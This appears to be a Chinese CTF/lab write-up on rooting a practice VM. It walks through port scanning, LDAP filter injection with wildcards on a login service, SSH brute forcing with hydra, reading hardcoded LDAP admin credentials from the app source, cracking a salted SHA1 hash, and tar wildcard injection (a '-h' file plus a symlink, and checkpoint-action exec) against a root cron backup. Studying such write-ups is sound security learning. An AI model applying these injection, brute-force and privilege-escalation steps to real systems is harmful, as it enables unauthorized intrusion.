> 关联：[[index|靶机记录]]、[[../常用命令/nmap|nmap]]、[[../常用命令/提权命令|提权命令]]、[[../安全学习/rce提权/提权总览|提权总览]]

# 主机发现
![](file-20260511154331418.png)
主机ip：` 10.216.75.91`
# 信息收集
```bash
┌──(kali㉿kali)-[~]
└─$ what --raw

──────────────────────────────────────────────────
$ rustscan -a 10.216.75.91 --ulimit 5000 -- -A -sC -sV  (exit: 0)
(原始 8277 字符，按 max_output_chars 保留头尾)
──────────────────────────────────────────────────

结论

目标主机 10.216.75.91 开放了三个端口（22、389、8084），其中 8084 端口运行着一个自定义的“内部目录认证终端 v1.0”（INTERNAL DIRECTORY AUTH
TERMINAL），要求提供用户名和密码，极有可能是一个敏感的内部管理入口。

关键发现

 1 开放端口与服务
    • 22/tcp：OpenSSH 10.0
    • 389/tcp：OpenLDAP 2.2.X – 2.3.X
    • 8084/tcp：自定义服务（返回 ASCII 艺术标题和登录提示）
 2 8084 端口细节
    • 服务返回类似终端界面，标题为 INTERNAL DIRECTORY AUTH TERMINAL v1.0
    • 提示 IDENTIFICATION REQUIRED，要求输入 Username: 和 Password:
    • Nmap 指纹识别显示该服务为“websnp?”，可能是一个基于 Web 的 LDAP 管理终端或自定义认证接口
 3 操作系统
    • 可能为 Linux 4.x/5.x，或 MikroTik RouterOS 7.x（内核 5.6.3）
    • MAC 地址为 08:00:27:20:56:B6（Oracle VirtualBox 虚拟网卡），说明是虚拟机环境
 4 其他信息
    • 目标位于同一子网（ARP Ping 成功）
    • 端口 389（LDAP）可能与该认证终端关联，用于目录服务

下一步建议

立即行动

 1 尝试默认/弱口令登录 8084 端口
    • 使用常见默认凭据（如 admin/admin、root/toor、admin/password）通过浏览器或 curl 交互：

       curl -v http://10.216.75.91:8084/ -d "Username=admin&Password=admin"

    • 也可使用 Burp Suite 或 Hydra 进行爆破（注意可能有限速）
 2 深入识别 8084 服务
    • 使用 whatweb 或 wappalyzer 检测 Web 技术栈
    • 查看完整 HTTP 响应头（Nmap 输出已截断，需重新扫描或直接连接）
    • 尝试访问不同路径或使用 dirsearch 扫描目录
 3 针对 LDAP 进行枚举
    • 使用 ldapsearch 或 nmap --script ldap-* 扫描 389 端口，获取 DIT 结构：

       nmap -p 389 --script ldap-search,ldap-rootdse 10.216.75.91

    • 如果获得凭据，可通过 LDAP 修改用户信息或进行横向移动
 4 检查 SSH 是否存在已知漏洞
    • OpenSSH 10.0 相对较新，但应搜索 CVE（如 CVE-2023-38408）
    • 尝试 SSH 弱口令爆破（如 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.216.75.91）

后续渗透方向

 • 内网横向：如果取得 LDAP 或 SSH 访问，可尝试枚举本地网络、获取更多敏感信息
 • 虚拟环境测试：由于是 VirtualBox 虚拟机，可能存在 Hypervisor 逃逸风险（低概率）
 • Web 服务深入：8084 终端的登录页面可能包含 SQL/LDAP 注入、XSS 或命令注入漏洞

▌ ⚠️ 注意：该靶场可能设计为模拟内部目录认证系统，建议优先爆破弱口令或尝试常见 LDAP 默认账号（如 cn=admin,dc=example,dc=com）。

```
有一个LDAP服务，8084端口好像就是LDAP的认证系统，但是我们没有账号密码，都不知道的情况下爆破就不太可能了。我们只能从LDAP本身入手了了。但是我没接触过，还需要去学习一下。
# LDAP的基本概念

LDAP是轻量目录访问协议，英文全称是Lightweight Directory Access Protocol，一般都简称为LDAP。其中`LDAP的开源实现是OpenLDAP`
意思就是LDAP就是目录版的数据库
键的地方就在于，**数据是存储在目录中，而不是数据库中**。的确，目录和数据库有很多共同之处，都能存储数据、并能在一定程度进行搜索和查询。这里就有一个问题了，目录和数据库的区别在哪？
最重要的区别就是**目录适合于存放静态数据**，它存储的数据无论在类型和种类较之数据库中的数据都要更为繁多，包括音频、视频、可执行文件、文本等文件，另外目录中还存在目录的递归。既然是存放不同类型的静态数据，那么目录服务在进行优化后更适宜于读访问，而非写、修改等操作。
这里是LDAP的目录结构
![](file-20260511181704744.png)
## DN&RDN

| **DN** (Distinguished Name) | 完整路径 | `cn=admin,dc=aldape,dc=dsz` |
| --------------------------- | ---- | --------------------------- |
| **RDN** (Relative DN)       | 相对路径 | `cn=admin`                  |
每个条目会会有一个唯一的DN。
## 条目（Entry）
条目，也叫记录项，是LDAP中最基本的颗粒，就想字典中的词条或者是数据中的记录。通常对LDAP的添加、删除、修改、搜索都是以条目为基本单位。
## 属性（Attribute）
每个条目都可以有很多属性（Attribute），比如常见的人都有姓名、地址、电话等属性。每个属性都有名称及对应的值，属性值可以有单个、多个，比如你有多个邮箱。
	
此外，LDAP为人员组织机构中常见的对象都设计了属性(比如commonName，surname)。

常见属性：
### 1. **命名属性**（用于构建 DN）

|属性|全称|用途|示例|
|---|---|---|---|
|**dc**|Domain Component|域名组件|`dc=aldape,dc=dsz`|
|**ou**|Organizational Unit|组织单元|`ou=people`, `ou=groups`|
|**cn**|Common Name|通用名称|`cn=admin`, `cn=Thomas`|
|**uid**|User ID|用户ID|`uid=zhangsan`|

### 2. **描述属性**（描述对象特征）

|属性|用途|示例|
|---|---|---|
|**sn**|Surname（姓氏）|`sn=Zhang`|
|**givenName**|名字|`givenName=San`|
|**mail**|电子邮件|`mail=zhangsan@example.com`|
|**telephoneNumber**|电话号码|`telephoneNumber=13800138000`|

## 对象类（ObjectClass）
对象类是属性的集合，LDAP预想了很多人员组织机构中常见的对象，并将其封装成对象类。比如人员（person）含有姓（sn）、名（cn）、电话(telephoneNumber)、密码(userPassword)等属性，单位职工(organizationalPerson)是人员(person)的继承类，除了上述属性之外还含有职务（title）、邮政编码（postalCode）、通信地址(postalAddress)等属性。

通过对象类可以方便的定义条目类型。每个条目可以直接继承多个对象类，这样就继承了各种属性。如果2个对象类中有相同的属性，则条目继承后只会保留1个属性。对象类同时也规定了哪些属性是基本信息，即必要属性和可选属性。

## IDAP常用工具
| 工具           | 用途   | 需要认证   | 类似命令             |
| ------------ | ---- | ------ | ---------------- |
| `ldapsearch` | 查询数据 | 取决于ACL | `cat`, `less`    |
| `ldapwhoami` | 查看身份 | 可选     | `whoami`         |
| `ldapadd`    | 添加条目 | 通常需要   | `touch`, `mkdir` |
| `ldapmodify` | 修改条目 | 通常需要   | `sed`, `vim`     |
| `ldapdelete` | 删除条目 | 通常需要   | `rm`             |
| `ldappasswd` | 改密码  | 需要     | `passwd`         |

# LDAP注入
尝试一下LDAP注入
这里猜测最简单的登录查询应该是
```ldap
(&(uid={uid})(userPassword={userPassword}))
```
我们输入`admin/*`，试一下
![](file-20260511184737318.png)
成功了，因为此时查询变成了：
```ldap
(&(uid={admin})(userPassword={*}))
```
ldap查询是支持通配符的，所以匹配成功了（后面试了不知道用户名用`*/*`也能成功）
![](file-20260511184903407.png)
得到了信息
```md

[+] AUTHENTICATION SUCCESSFUL
[*] NODE_INFO:Out of office. For any urgent issues, please contact tonglinggejimo@aldape.dsz.
	//不在办公室。如有任何紧急问题，请联系tonglinggejimo@aldape.dsz
```
那在试试这个用户名
![](file-20260511185319692.png)
```md
[+] AUTHENTICATION SUCCESSFUL
[*] NODE_INFO: Internal maintenance account.
	内部维护账户。
```
既然是维护账号，那么爆破一下ssh。
![](file-20260511190346682.png)
爆破出来了:
- `tonglinggejimo` / `tonglinggejimo`
- `flag{user-c009ca4f3c9cd9ee4c5394130d9cec02}`
# 提权

传pspy上去看看：
![](file-20260511205959436.png)
存在root的定时任务，会把`/opt/backup_source`下的文件全部打包到`/var/backups/data/backup.tar.gz`
![](file-20260511234708137.png)
但是可以看到`/opt/backup_source`是只可读的，暂时利用不了
但是却是`backup_admin`用户可写，难道要横向到`backup_admin`。
## backup_admin用户
先看了一下认证页面的源码
```py
tonglinggejimo@Aldape:~$ cat /opt/authtool/app.py
import socket
import threading
import logging
import sys
from ldap3 import Server, Connection, ALL

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

LDAP_SERVER = 'ldap://127.0.0.1:389'
BASE_DN = 'dc=aldape,dc=dsz'
BIND_DN = 'cn=admin,dc=aldape,dc=dsz'
BIND_PW = '30almaz'

BANNER = r"""
    ___    __    ____  ___    ____  ______
   /   |  / /   / __ \/   |  / __ \/ ____/
  / /| | / /   / / / / /| | / /_/ / __/
 / ___ |/ /___/ /_/ / ___ |/ ____/ /___
/_/  |_/_____/_____/_/  |_/_/   /_____/
>> INTERNAL DIRECTORY AUTH TERMINAL v1.0 <<
"""

def handle_client(client_socket):
    try:
        client_socket.sendall(BANNER.encode())
        client_socket.sendall(b"\n[!] IDENTIFICATION REQUIRED\n")

        client_socket.sendall(b"Username: ")
        uid = client_socket.recv(1024).decode().strip()

        client_socket.sendall(b"Password: ")
        pwd = client_socket.recv(1024).decode().strip()

        if not uid or not pwd:
            client_socket.sendall(b"[-] ERROR: EMPTY CREDENTIALS\n")
            return

        search_filter = f"(&(uid={uid})(userPassword={pwd}))"
        logger.info(f"NC Query Filter: {search_filter}")

        server = Server(LDAP_SERVER, get_info=ALL, connect_timeout=3)
        conn = Connection(server, user=BIND_DN, password=BIND_PW)

        if not conn.bind():
            logger.error("LDAP Bind Failed")
            client_socket.sendall(b"[-] SYSTEM ERROR: LDAP_UNAVAILABLE\n")
            return

        conn.search(search_base=BASE_DN, search_filter=search_filter, attributes=['description'])

        if conn.entries:
            logger.info(f"Blind Hint Triggered for: {uid}")
            client_socket.sendall(b"\n[+] AUTHENTICATION SUCCESSFUL\n")
            client_socket.sendall(f"[*] NODE_INFO: {conn.entries[0].description}\n".encode())
        else:
            logger.warning(f"Failed attempt: {uid}")
            client_socket.sendall(b"\n[-] ACCESS DENIED: INVALID DATA\n")

        conn.unbind()
    except Exception as e:
        logger.error(f"Socket Exception: {str(e)}")
        client_socket.sendall(f"\n[!] CORE_CRASH: {str(e)}\n".encode())
    finally:
        client_socket.close()

def start_server():
    server_ip = "0.0.0.0"
    port = 8084

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((server_ip, port))
    server.listen(5)

    logger.info(f"NC Terminal listening on {server_ip}:{port}")

    while True:
        client, addr = server.accept()
        logger.info(f"Accepted connection from {addr[0]}:{addr[1]}")
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

if __name__ == "__main__":
    start_server()
```
直接拿到了LDAP管理员的密码
又读了一下LDAP
```md
tonglinggejimo@Aldape:~$ ldapsearch -x -H ldap://127.0.0.1:389 -D "cn=admin,dc=aldape,dc=dsz" -w "30almaz" -b "dc=aldape,dc=dsz"
# extended LDIF
#
# LDAPv3
# base <dc=aldape,dc=dsz> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# aldape.dsz
dn: dc=aldape,dc=dsz
objectClass: top
objectClass: dcObject
objectClass: organization
o: Aldape Security
dc: aldape

# users, aldape.dsz
dn: ou=users,dc=aldape,dc=dsz
objectClass: organizationalUnit
ou: users

# admin, users, aldape.dsz
dn: uid=admin,ou=users,dc=aldape,dc=dsz
objectClass: inetOrgPerson
cn: Administrator
sn: Admin
uid: admin
description: Out of office. For any urgent issues, please contact tonglinggeji
 mo@aldape.dsz.
userPassword:: MzBhbG1heg==

# tonglinggejimo, users, aldape.dsz
dn: uid=tonglinggejimo,ou=users,dc=aldape,dc=dsz
objectClass: inetOrgPerson
cn: Tongling Gejimo
sn: Gejimo
uid: tonglinggejimo
userPassword:: dG9uZ2xpbmdnZWppbW8=
description: Internal maintenance account.

# backup_admin, users, aldape.dsz
dn: uid=backup_admin,ou=users,dc=aldape,dc=dsz
objectClass: inetOrgPerson
cn: Backup Administrator
sn: Backup
uid: backup_admin
userPassword:: e1NTSEF9SUVSL0JsOVhLSFBnQTZMR0xBMkRrbk95cVpIODJtd3U=
description: Account for backup jobs.

# search result
search: 2
result: 0 Success

# numResponses: 6
# numEntries: 5
```
拿到了账号密码，但是都只是简单的加密，就backup_admin是两层，还一层哈希，这个哈希还爆破不出来，我加了一堆规则把rockyou跑为了都爆破不出来，那应该不是走爆破了。
尝试了修改密码，能修改LDAP的，但是修改了没用，LDAP密码也没真正改，sudo密码也没有改

问了出题人，结果突然能爆出来了。。。估计是我哪里手残了（对不起sublarge佬）
```bash
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Salted-SHA1 [SHA1 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1prorodeo        (?)
1g 0:00:00:01 DONE (2026-05-12 09:19) 0.6410g/s 8339Kp/s 8339Kc/s 8339KC/s 1whizkid..1jfine
Use the "--show" option to display all of the cracked passwords reliably
```
## 通配符注入
ok现在可以开始通配符注入了。
![](file-20260512140833560.png)

写了但是完全没触发，问了一下ai，发现是：
tar 通配符注入提权依赖的是 **GNU tar** 的两个特有参数：
- --checkpoint=1
- --checkpoint-action=exec=sh shell.sh

然而，**BusyBox 版本的 tar 是经过阉割的，完全没有这些参数**。

这里看了其他人的wp，才知道还可以`-h`参数去注入
先创建一个`-h`的文件，在创建一个软连接。
![](file-20260512211327640.png)
这下等定时任务执行时会以root身份把文件打包进特定的目录：`/var/backups/data/backup.tar.gz`
又因为`-h`参数所以会跟随到软连接指定的文件，一起打包。root的身份所以可以把root的文件也打包进来。
然后我们把那个压缩包解压即可。
![](file-20260512211727726.png)
